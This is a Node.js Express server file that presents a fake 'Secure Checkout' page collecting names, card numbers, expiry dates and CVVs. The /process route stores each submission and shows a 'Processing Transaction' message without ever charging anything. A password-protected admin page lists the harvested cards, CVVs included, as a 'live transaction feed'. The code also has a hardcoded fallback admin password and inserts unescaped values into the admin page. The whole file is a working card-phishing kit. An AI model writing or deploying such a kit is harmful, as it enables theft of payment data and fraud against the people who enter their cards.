require('dotenv').config();
const express = require('express');
const session = require('express-session');
const app = express();

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ricoburac7';
const SESSION_SECRET = process.env.SESSION_SECRET || 'super-secret-key';

app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: true
}));

let database = [];

const paymentPage = `
<!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Secure Checkout</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-slate-50 flex items-center justify-center min-h-screen">
    <div class="bg-white p-8 rounded-2xl shadow-xl w-full max-w-md border border-gray-100">
        <h2 class="text-2xl font-bold text-gray-800 mb-2">Secure Payment</h2>
        <form action="/process" method="POST" class="space-y-4">
            <input type="text" name="name" placeholder="Name" required class="w-full p-3 border rounded-lg">
            <input type="text" name="card" placeholder="Card Number" required class="w-full p-3 border rounded-lg">
            <div class="flex gap-4">
                <input type="text" name="exp" placeholder="MM/YY" required class="flex-1 p-3 border rounded-lg">
                <input type="text" name="cvv" placeholder="CVV" required class="flex-1 p-3 border rounded-lg">
            </div>
            <button class="w-full bg-blue-600 text-white font-bold py-4 rounded-lg">Pay Now</button>
        </form>
    </div>
</body>
</html>`;

const adminPage = (data) => `
<!DOCTYPE html>
<html>
<head><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-gray-900 text-white p-8 font-mono">
    <div class="max-w-5xl mx-auto flex justify-between mb-8">
        <h1 class="text-2xl text-green-400 font-bold underline">LIVE TRANSACTION FEED</h1>
        <a href="/logout" class="bg-red-500 px-4 py-2 rounded text-xs text-white">LOGOUT</a>
    </div>
    <div class="overflow-hidden rounded-lg border border-gray-700">
        <table class="w-full text-left">
            <tbody class="divide-y divide-gray-800">
                ${data.map(i => `<tr><td class="p-4 text-gray-500">${i.time}</td><td class="p-4">${i.name}</td><td class="p-4 text-yellow-500">${i.card}</td><td class="p-4">${i.exp}</td><td class="p-4 text-red-500">${i.cvv}</td></tr>`).join('')}
            </tbody>
        </table>
    </div>
</body>
</html>`;

app.get('/', (req, res) => res.send(paymentPage));
app.post('/process', (req, res) => {
    database.unshift({ ...req.body, time: new Date().toLocaleTimeString() });
    res.send("<body style='text-align:center; padding-top:100px;'><h2>Processing Transaction...</h2></body>");
});
app.get('/login', (req, res) => {
    res.send('<body style="background:#111827; display:flex; justify-content:center; align-items:center; height:100vh;"><form action="/login" method="POST" style="background:white; padding:40px; border-radius:10px;"><h3>Admin Access</h3><input type="password" name="pw" style="border:1px solid #ccc; padding:10px; width:100%"><br><button style="width:100%; margin-top:20px; background:blue; color:white; padding:10px; border:none; border-radius:5px;">Login Search</button></form></body>');
});
app.post('/login', (req, res) => {
    if (req.body.pw === ADMIN_PASSWORD) {
        req.session.auth = true;
        res.redirect('/admin');
    } else { res.send('Wrong password.'); }
});
app.get('/admin', (req, res) => {
    if (!req.session.auth) return res.redirect('/login');
    res.send(adminPage(database));
});
app.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/login');
});

app.listen(PORT, () => console.log(`Server started on port ${PORT}`));
